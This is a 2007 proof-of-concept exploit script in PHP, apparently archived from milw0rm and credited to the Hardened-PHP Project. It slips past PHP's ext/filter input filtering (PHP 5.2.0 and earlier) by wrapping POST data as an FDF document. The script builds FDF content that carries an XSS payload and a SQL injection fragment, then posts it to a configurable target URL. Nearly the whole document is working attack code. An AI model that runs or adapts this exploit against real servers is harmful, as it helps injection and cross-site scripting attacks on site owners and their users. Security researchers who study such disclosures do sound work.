<html><head><title>PHP <= 5.2.0 ext/filter FDF Post Filter Bypass Exploit</title></head><pre>&lt;?php
  ////////////////////////////////////////////////////////////////////////
  //  _  _                _                     _       ___  _  _  ___  //
  // | || | __ _  _ _  __| | ___  _ _   ___  __| | ___ | _ \| || || _ \ //
  // | __ |/ _` || '_|/ _` |/ -_)| ' \ / -_)/ _` ||___||  _/| __ ||  _/ //
  // |_||_|\__,_||_|  \__,_|\___||_||_|\___|\__,_|     |_|  |_||_||_|   //
  //                                                                    //
  //         Proof of concept code from the Hardened-PHP Project        //
  //                   (C) Copyright 2007 Stefan Esser                  //
  //                                                                    //
  ////////////////////////////////////////////////////////////////////////
  //            PHP ext/filtet FDF POST Filter Bybass Exploit           //
  ////////////////////////////////////////////////////////////////////////

  // This is meant as a protection against remote file inclusion.
  die(&quot;REMOVE THIS LINE&quot;);

  // _POST is the array that will be sent to the url in $url
  $_POST = array();
  $_POST['var1'] = &quot;&lt;script&gt;alert(/XSS/);&lt;/script&gt;&quot;;
  $_POST['var2'] = &quot; ' UNION SELECT &quot;;

  $url = &quot;http://127.0.0.1/info.php&quot;;  
  
  // You do not need to change anything below this
  
  $outfdf = fdf_create();
  foreach ($_POST as $key =&gt; $value) {
    fdf_set_value($outfdf, $key, $value, 0);
  }
  fdf_save($outfdf, &quot;outtest.fdf&quot;);
  fdf_close($outfdf);
  
  $ret = file_get_contents(&quot;outtest.fdf&quot;);
  unlink(&quot;outtest.fdf&quot;);
  
  $params = array('http' =&gt; array(
      'method' =&gt; 'POST',
      'content' =&gt; $ret,
      'header' =&gt; 'Content-Type: application/vnd.fdf'
  ));
  
  $ctx = stream_context_create($params);
  $fp = @fopen($url, 'rb', false, $ctx);
  if (!$fp) {
    die(&quot;Cannot open $url&quot;);
  }
  $response = @stream_get_contents($fp); 

  echo $response;
  echo &quot;\n&quot;;
?&gt; 

# milw0rm.com [2007-03-10]</pre></html>